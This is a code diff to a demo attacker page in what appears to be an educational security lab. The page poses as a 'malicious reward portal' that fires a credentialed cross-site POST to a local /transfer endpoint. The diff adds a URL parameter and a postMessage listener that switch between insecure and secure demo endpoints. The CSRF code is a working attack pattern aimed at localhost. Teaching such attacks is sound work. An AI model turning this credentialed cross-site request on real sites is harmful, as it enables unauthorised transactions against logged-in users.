@@ -136,15 +136,20 @@ h1 {
     <div class="attack-console" id="console"></div>
 
    
+    
 </div>
 
 <script>
 
-const USE_SECURE_ENDPOINTS = false;
+const params = new URLSearchParams(window.location.search);
+let modeParam = (params.get('mode') || '').toLowerCase();
+let USE_SECURE_ENDPOINTS = modeParam === 'secure';
 
-const API_BASE = USE_SECURE_ENDPOINTS
+function getApiBase() {
+  return USE_SECURE_ENDPOINTS
     ? 'http://localhost:5000/api/secure/csrf'
     : 'http://localhost:5000/api/attack/csrf';
+}
 
 const consoleDiv = document.getElementById("console");
 
@@ -157,10 +162,20 @@ function log(message, type="info") {
     consoleDiv.scrollTop = consoleDiv.scrollHeight;
 }
 
+function renderModeBanner() {
+  const base = getApiBase();
+  log(`🧭 Current mode: ${USE_SECURE_ENDPOINTS ? "SECURE" : "INSECURE"} | API: ${base}`, "info");
+}
+
 async function performCSRFAttack() {
     log("🚨 Initiating background transaction...", "error");
+    log(
+      `🎛️ Targeting ${USE_SECURE_ENDPOINTS ? 'SECURE' : 'INSECURE'} endpoints`,
+      USE_SECURE_ENDPOINTS ? "success" : "warning"
+    );
 
     try {
+        const API_BASE = getApiBase();
         const response = await fetch(`${API_BASE}/transfer`, {
             method: "POST",
             credentials: "include",
@@ -190,6 +205,31 @@ async function performCSRFAttack() {
 
 window.addEventListener("load", () => {
     log("🌐 Malicious reward portal loaded", "info");
+    if (!modeParam) {
+      log("ℹ️ No mode specified. Defaulting to INSECURE endpoints.", "warning");
+    }
+    renderModeBanner();
+});
+
+// Allow the main app to push mode reliably (even if this page is already open).
+window.addEventListener("message", (event) => {
+  // The sender is the main app (Vite dev server port can vary).
+  // Accept any localhost/127.0.0.1 origin (dev-only educational project).
+  if (!/^http:\/\/(localhost|127\.0\.0\.1)(:\d+)?$/.test(event.origin)) return;
+  const data = event.data || {};
+  if (data.type !== "SECURESCAPE_MODE") return;
+
+  const nextMode = String(data.mode || "").toLowerCase();
+  const nextSecure = nextMode === "secure";
+  if (nextSecure === USE_SECURE_ENDPOINTS) return;
+
+  USE_SECURE_ENDPOINTS = nextSecure;
+  modeParam = nextMode;
+  log(
+    `🔄 Mode updated by main app → ${USE_SECURE_ENDPOINTS ? "SECURE" : "INSECURE"}`,
+    "info"
+  );
+  renderModeBanner();
 });
 </script>
 
